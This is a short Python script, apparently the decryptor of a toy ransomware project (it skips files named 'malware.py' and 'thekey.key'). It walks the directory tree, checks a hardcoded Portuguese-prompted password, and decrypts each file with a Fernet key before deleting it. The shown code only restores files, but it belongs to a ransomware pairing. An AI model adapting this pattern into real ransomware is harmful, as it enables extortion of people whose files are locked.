import os
from cryptography.fernet import Fernet

files = []


def add_files_by_dir(path: str = '.'):
    for file in os.listdir(path):
        if file in (
            'malware.py',
            'thekey.key',
            'decrypt.py',
            '.gitignore',
            'requirements.txt',
            '.git',
            '.venv',
        ):
            continue
        file = os.path.join(path, file)
        if os.path.isfile(file):
            files.append(file)
        else:
            add_files_by_dir(file)


add_files_by_dir()

with open('thekey.key', 'rb') as thekey:
    secretkey = thekey.read()

passpharase = 'Senha123'
upasspharase = input('Digite a senha para descritografar seus dados: ')

if passpharase == upasspharase:
    for file in files:
        with open(file, 'rb') as thefile:
            encrypted_content = thefile.read()

        content = Fernet(secretkey).decrypt(encrypted_content)

        with open(file, 'wb') as thefile:
            thefile.write(content)
    print('Arquivos descriptografados.')
    os.remove('thekey.key')
else:
    print('Senha incorreta.')
